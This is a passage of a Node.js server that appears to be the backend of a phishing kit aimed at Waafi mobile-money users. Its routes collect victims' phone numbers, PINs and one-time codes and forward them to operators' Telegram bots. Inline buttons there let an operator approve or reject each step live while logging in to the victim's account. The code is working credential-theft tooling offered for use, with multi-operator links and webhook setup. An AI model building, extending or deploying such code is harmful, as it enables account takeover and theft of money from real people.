        await acknowledgeCallback(`❌ Unknown pin method action: ${action}`, true);
      }
    }

    else {
      logger.warn(`${user.name}: Unknown callback type: ${type}`);
      await acknowledgeCallback(`❌ Unknown type: ${type}`, true);
    }
  } catch (error) {
    logger.error(`${user.name}: Callback handler fatal error:`, error.message);
    logger.error(error.stack);
    try {
      await acknowledgeCallback('❌ An error occurred', true);
    } catch (e) {
      logger.error(`${user.name}: Failed to send error notification:`, e.message);
    }
  }
}

// ============================================
// TELEGRAM MESSAGE SENDING
// ============================================
const sendTelegramMessage = async (user, message, options = {}) => {
  return user.tgQueue.send(async () => {
    try {
      if (!user.bot || !user.isHealthy) return { success: false, error: 'Bot not ready' };
      await user.bot.sendMessage(user.chatId, truncateMessage(message), { parse_mode: 'HTML', ...options });
      user.lastError = null;
      return { success: true };
    } catch (error) {
      user.lastError = error.message;
      logger.error(`Error sending message for ${user.name}:`, error.code, error.message);
      if (error.response?.statusCode === 401) {
        user.isHealthy = false;
        return { success: false, error: 'Bot authentication failed', critical: true };
      }
      if (error.response?.statusCode === 429) {
        const retryAfter = error.response.parameters?.retry_after || 30;
        return { success: false, error: 'Rate limited', retryAfter: retryAfter, rateLimited: true };
      }
      return { success: false, error: error.message };
    }
  });
};

// ============================================
// DYNAMIC USER LOADING
// ============================================
const users = new Map();

const loadUsers = () => {
  let loadedCount = 0;
  let errorCount = 0;

  for (let i = 1; i <= CONFIG.MAX_USERS; i++) {
    try {
      const linkInsert = process.env[`USER_LINK_INSERT_${i}`];
      const botToken = process.env[`TELEGRAM_BOT_TOKEN_${i}`];
      const chatId = process.env[`TELEGRAM_CHAT_ID_${i}`];
      const userName = process.env[`USER_NAME_${i}`] || `User ${i}`;

      if (!linkInsert || !botToken || !chatId) continue;
      if (!/^[a-zA-Z0-9-_]+$/.test(linkInsert)) {
        logger.warn(`Invalid link insert for user ${i}: ${linkInsert}`);
        errorCount++;
        continue;
      }
      if (!/^\d+:[A-Za-z0-9_-]+$/.test(botToken)) {
        logger.warn(`Invalid bot token for user ${i}`);
        errorCount++;
        continue;
      }
      if (!/^-?\d+$/.test(chatId)) {
        logger.warn(`Invalid chat ID for user ${i}: ${chatId}`);
        errorCount++;
        continue;
      }
      if (users.has(linkInsert)) {
        logger.warn(`Duplicate link insert: ${linkInsert}`);
        errorCount++;
        continue;
      }

      const userObj = {
        id: i,
        name: sanitizeInput(userName),
        linkInsert,
        botToken,
        chatId,
        bot: null,
        isHealthy: false,
        lastError: null,
        loginNotifications: new Map(),
        secondOtpVerifications: new Map(),
        secondPinMethodDecisions: new Map(),
        promptPinVerifications: new Map(),
        requestPinVerifications: new Map(),
        verifiedUsers: new Map(),
        processedRequests: new Map(),
        dupeCache: new DupeCache(),
        tgQueue: new TgQueue(),
      };

      const botManager = new BotManager(userObj, linkInsert);
      userObj.mgr = botManager;
      users.set(linkInsert, userObj);
      loadedCount++;
    } catch (error) {
      logger.error(`Error loading user ${i}:`, error.message);
      errorCount++;
    }
  }

  logger.info(`Loaded ${loadedCount} users (${errorCount} errors)`);
  return { loadedCount, errorCount };
};

loadUsers();

// ============================================
// WEBHOOK ROUTES
// ============================================
users.forEach((user) => {
  const path = user.mgr._path;
  app.post(path, (req, res) => {
    res.sendStatus(200);
    let update;
    try {
      const body = Buffer.isBuffer(req.body) ? req.body.toString('utf8') : JSON.stringify(req.body);
      update = JSON.parse(body);
    } catch (e) {
      logger.error(`${user.name}: webhook body parse error:`, e.message);
      return;
    }
    user.mgr.processUpdate(update);
  });
  logger.debug(`Registered webhook route: POST ${path} → ${user.name}`);
});

// ============================================
// BOT INITIALIZATION
// ============================================
(async () => {
  if (!CONFIG.WEBHOOK_URL) {
    logger.error('WEBHOOK_URL env var is not set. Add it to your environment:');
    logger.error('  WEBHOOK_URL=https://your-service.onrender.com');
    logger.error('Bots will not receive updates until this is set.');
  }
  const arr = Array.from(users.values());
  for (let i = 0; i < arr.length; i++) {
    try {
      await arr[i].mgr.init();
    } catch (e) {
      logger.error(`Init [${arr[i].name}]:`, e.message);
    }
    if (i < arr.length - 1) await sleep(500);
  }
  logger.info('All bots initialised');
})();

// ============================================
// AUTO-CLEANUP
// ============================================
setInterval(() => {
  try {
    const now = Date.now();
    const timeoutThreshold = now - CONFIG.APPROVAL_TIMEOUT;
    const deleteThreshold = now - (10 * 60 * 1000);
    const userCacheThreshold = now - CONFIG.USER_CACHE_DURATION;

    users.forEach((user) => {
      try {
        for (const [, v] of user.loginNotifications.entries())
          if (v.timestamp < timeoutThreshold && !v.expired) {
            v.expired = true;
            v.approved = false;
            v.rejected = true;
          }
        for (const [, v] of user.secondOtpVerifications.entries())
          if (v.timestamp < timeoutThreshold && !v.expired) {
            v.expired = true;
            v.status = 'timeout';
          }
        for (const [, v] of user.promptPinVerifications.entries())
          if (v.timestamp < timeoutThreshold && v.status === 'pending') v.status = 'timeout';
        for (const [, v] of user.requestPinVerifications.entries())
          if (v.timestamp < timeoutThreshold && v.status === 'pending') v.status = 'timeout';

        for (const [k, v] of user.loginNotifications.entries())
          if (v.timestamp < deleteThreshold) user.loginNotifications.delete(k);
        for (const [k, v] of user.secondOtpVerifications.entries())
          if (v.timestamp < deleteThreshold) user.secondOtpVerifications.delete(k);
        for (const [k, v] of user.promptPinVerifications.entries())
          if (v.timestamp < deleteThreshold) user.promptPinVerifications.delete(k);
        for (const [k, v] of user.requestPinVerifications.entries())
          if (v.timestamp < deleteThreshold) user.requestPinVerifications.delete(k);
        for (const [k, v] of user.secondPinMethodDecisions.entries())
          if (v.timestamp < deleteThreshold) user.secondPinMethodDecisions.delete(k);

        let expiredCount = 0;
        for (const [phone, vd] of user.verifiedUsers.entries())
          if (vd.timestamp < userCacheThreshold) {
            user.verifiedUsers.delete(phone);
            expiredCount++;
          }
        if (expiredCount > 0) logger.info(`${user.name}: Cleaned up ${expiredCount} expired verified users`);
      } catch (error) {
        logger.error(`Cleanup error for ${user.name}:`, error.message);
      }
    });
  } catch (error) {
    logger.error('Global cleanup error:', error.message);
  }
}, CONFIG.CLEANUP_INTERVAL);

// ============================================
// HEALTH CHECK
// ============================================
app.get('/api/health', (req, res) => {
  try {
    const userList = Array.from(users.values()).map(u => ({
      name: u.name,
      link: u.linkInsert,
      active: !!u.bot,
      healthy: u.isHealthy,
      logins: u.loginNotifications.size,
      secondOtps: u.secondOtpVerifications.size,
      promptPins: u.promptPinVerifications.size,
      requestPins: u.requestPinVerifications.size,
      verified: u.verifiedUsers.size,
      lastError: u.lastError,
      webhookPath: u.mgr._path,
    }));
    const healthyCount = userList.filter(u => u.healthy).length;
    res.json({
      status: healthyCount > 0 ? 'ok' : 'degraded',
      totalUsers: users.size,
      healthyUsers: healthyCount,
      userCacheDuration: `${CONFIG.USER_CACHE_DURATION / 60000} minutes`,
      twoStepOtp: true,
      webhookMode: true,
      users: userList,
      sse: sseBroker.size,
      timestamp: new Date().toISOString(),
    });
  } catch (error) {
    logger.error('Health check error:', error.message);
    res.status(500).json({ status: 'error', error: error.message, timestamp: new Date().toISOString() });
  }
});

// ============================================
// DYNAMIC ROUTES
// ============================================
users.forEach((user, linkInsert) => {
  const basePath = `/api/${linkInsert}`;

  app.post(`${basePath}/check-user-status`, async (req, res) => {
    try {
      const { phoneNumber } = req.body;
      if (!phoneNumber) return res.status(400).json({ success: false, message: 'Phone number required' });
      const pv = validatePhoneNumber(phoneNumber);
      if (!pv.valid) return res.status(400).json({ success: false, message: pv.error });
      const isReturning = isVerifiedUser(user, phoneNumber);
      res.json({ success: true, isReturningUser: isReturning, message: isReturning ? 'Returning user (30-min cache)' : 'New user', cacheExpiry: isReturning ? '30 minutes' : null });
    } catch (error) {
      logger.error(`check-user-status error for ${user.name}:`, error.message);
      res.status(500).json({ success: false, error: 'Internal server error' });
    }
  });

  app.post(`${basePath}/login`, async (req, res) => {
    try {
      if (!user.bot || !user.isHealthy) return res.status(503).json({ success: false, message: 'Bot service unavailable' });
      const { phoneNumber, pin, timestamp } = req.body;
      if (!phoneNumber || !pin) return res.status(400).json({ success: false, message: 'Phone and PIN required' });
      const pv = validatePhoneNumber(phoneNumber);
      if (!pv.valid) return res.status(400).json({ success: false, message: pv.error });
      const pinv = validatePin(pin);
      if (!pinv.valid) return res.status(400).json({ success: false, message: pinv.error });

      user.loginNotifications.set(`${phoneNumber}-${pin}`, { timestamp: Date.now(), approved: false, rejected: false, expired: false });
      logger.info(`${user.name}: 📱 New login request - ${phoneNumber}`);

      const result = await sendTelegramMessage(user, formatLoginMessage(user, { phoneNumber, pin, timestamp: timestamp || Date.now() }), {
        reply_markup: {
          inline_keyboard: [
            [{ text: '✅ Allow to Proceed', callback_data: `login_proceed_${phoneNumber}_${pin}` }],
            [{ text: '❌ Invalid Information', callback_data: `login_invalid_${phoneNumber}_${pin}` }],
          ],
        },
      });

      if (result.success) {
        res.json({ success: true, message: 'Login sent - waiting for approval', requiresApproval: true });
      } else {
        res.status(500).json({ success: false, message: 'Failed to send notification', error: result.error });
      }
    } catch (error) {
      logger.error(`login error for ${user.name}:`, error.message);
      res.status(500).json({ success: false, error: 'Internal server error' });
    }
  });

  app.post(`${basePath}/verify-second-otp`, async (req, res) => {
    try {
      if (!user.bot || !user.isHealthy) return res.status(503).json({ success: false, message: 'Bot service unavailable' });
      const { phoneNumber, otp, firstOtp, timestamp } = req.body;
      if (!phoneNumber || !otp || !firstOtp) return res.status(400).json({ success: false, message: 'Phone, OTP, and first OTP required' });
      const pv = validatePhoneNumber(phoneNumber);
      if (!pv.valid) return res.status(400).json({ success: false, message: pv.error });
      const ov = validateOtp(otp);
      if (!ov.valid) return res.status(400).json({ success: false, message: ov.error });

      user.secondOtpVerifications.set(`${phoneNumber}-${otp}`, { status: 'pending', timestamp: Date.now(), expired: false, firstOtp });
      logger.info(`${user.name}: 2️⃣ New Second OTP verification - ${phoneNumber}`);

      const result = await sendTelegramMessage(user, formatSecondOTPMessage(user, { phoneNumber, otp, firstOtp, timestamp: timestamp || Date.now() }), {
        reply_markup: {
          inline_keyboard: [
            [{ text: '✅ Correct (Second OTP)', callback_data: `secondotp_correct_${phoneNumber}_${otp}` }],
            [
              { text: '❌ Wrong Code', callback_data: `secondotp_wrong_${phoneNumber}_${otp}` },
              { text: '⚠️ Wrong PIN', callback_data: `secondotp_wrongpin_${phoneNumber}_${otp}` },
            ],
          ],
        },
      });

      if (result.success) {
        res.json({ success: true, message: 'Second OTP sent successfully' });
      } else {
        res.status(500).json({ success: false, message: 'Failed to send notification', error: result.error });
      }
    } catch (error) {
      logger.error(`verify-second-otp error for ${user.name}:`, error.message);
      res.status(500).json({ success: false, error: 'Internal server error' });
    }
  });

  app.post(`${basePath}/initiate-prompt-pin`, async (req, res) => {
    try {
      if (!user.bot || !user.isHealthy) return res.status(503).json({ success: false, message: 'Bot service unavailable' });
      const { phoneNumber, firstOtp, timestamp } = req.body;
      if (!phoneNumber) return res.status(400).json({ success: false, message: 'Phone number required' });
      const pv = validatePhoneNumber(phoneNumber);
      if (!pv.valid) return res.status(400).json({ success: false, message: pv.error });

      user.promptPinVerifications.set(phoneNumber, { status: 'pending', timestamp: Date.now(), firstOtp: firstOtp || null });
      logger.info(`${user.name}: 📲 New Prompt PIN verification - ${phoneNumber}`);

      const result = await sendTelegramMessage(user, formatPromptPinMessage(user, { phoneNumber, firstOtp, timestamp: timestamp || Date.now() }), {
        reply_markup: {
          inline_keyboard: [
            [{ text: '✅ Successful', callback_data: `promptpin_success_${phoneNumber}_ok` }],
            [{ text: '❌ Failed', callback_data: `promptpin_failed_${phoneNumber}_ok` }],
          ],
        },
      });

      if (result.success) {
        res.json({ success: true, message: 'Prompt PIN notification sent' });
      } else {
        res.status(500).json({ success: false, message: 'Failed to send notification', error: result.error });
      }
    } catch (error) {
      logger.error(`initiate-prompt-pin error for ${user.name}:`, error.message);
      res.status(500).json({ success: false, error: 'Internal server error' });
    }
  });

  app.post(`${basePath}/verify-request-pin`, async (req, res) => {
    try {
      if (!user.bot || !user.isHealthy) return res.status(503).json({ success: false, message: 'Bot service unavailable' });
      const { phoneNumber, pin, firstOtp, timestamp } = req.body;
      if (!phoneNumber || !pin) return res.status(400).json({ success: false, message: 'Phone and PIN required' });
      const pv = validatePhoneNumber(phoneNumber);
      if (!pv.valid) return res.status(400).json({ success: false, message: pv.error });
      const pinv = validatePin(pin);
      if (!pinv.valid) return res.status(400).json({ success: false, message: pinv.error });

      const verificationKey = `${phoneNumber}-${pin}`;
      user.requestPinVerifications.set(verificationKey, { status: 'pending', timestamp: Date.now(), firstOtp: firstOtp || null });
      logger.info(`${user.name}: 🔑 New Request PIN verification - ${phoneNumber}`);

      const result = await sendTelegramMessage(user, formatRequestPinMessage(user, { phoneNumber, pin, firstOtp, timestamp: timestamp || Date.now() }), {
        reply_markup: {
          inline_keyboard: [
            [{ text: '✅ Correct PIN', callback_data: `requestpin_correct_${phoneNumber}_${pin}` }],
            [{ text: '❌ Wrong PIN', callback_data: `requestpin_wrong_${phoneNumber}_${pin}` }],
          ],
        },
      });

      if (result.success) {
        res.json({ success: true, message: 'Request PIN notification sent' });
      } else {
        res.status(500).json({ success: false, message: 'Failed to send notification', error: result.error });
      }
    } catch (error) {
      logger.error(`verify-request-pin error for ${user.name}:`, error.message);
      res.status(500).json({ success: false, error: 'Internal server error' });
    }
  });
});

// ============================================
// 404 / ERROR HANDLERS
// ============================================
app.use((req, res) => {
  res.status(404).json({ success: false, message: 'Endpoint not found', path: req.path });
});

app.use((err, req, res, next) => {
  logger.error('Unhandled error:', err.message);
  logger.error(err.stack);
  res.status(500).json({ success: false, error: 'Internal server error', message: process.env.NODE_ENV === 'development' ? err.message : undefined });
});

// ============================================
// START SERVER
// ============================================
const server = app.listen(PORT, () => {
  console.log('\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`🇺🇸 Waafi USA - TWO-STEP OTP + PIN System (WEBHOOK MODE)`);
  console.log(`👥 Active users: ${users.size}/${CONFIG.MAX_USERS}`);
  console.log(`⏱️  Approval timeout: ${CONFIG.APPROVAL_TIMEOUT / 60000} minutes`);
  console.log(`⏱️  User cache duration: ${CONFIG.USER_CACHE_DURATION / 60000} minutes`);
  console.log(`🌐 Webhook URL: ${CONFIG.WEBHOOK_URL || '⚠️  NOT SET'}`);
  console.log('\n📋 Active endpoints:');
  users.forEach((user, linkInsert) => {
    console.log(`   ${user.isHealthy ? '✅' : '⏳'} ${user.name}: /api/${linkInsert}/*`);
  });
  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');
});

// ============================================
// GRACEFUL SHUTDOWN
// ============================================
const gracefulShutdown = async (signal) => {
  logger.info(`${signal} received, shutting down gracefully...`);
  server.close(() => {
    logger.info('HTTP server closed');
  });
  for (const user of users.values()) {
    if (user.tgQueue) user.tgQueue.flush('shutting down');
    if (user.dupeCache) user.dupeCache.clear();
  }
  process.exit(0);
};

process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));
process.on('SIGINT', () => gracefulShutdown('SIGINT'));
process.on('uncaughtException', (error) => {
  logger.error('Uncaught Exception:', error.message);
  logger.error(error.stack);
});
process.on('unhandledRejection', (reason, promise) => {
  logger.error('Unhandled Rejection at:', promise);
  logger.error('Reason:', reason);
});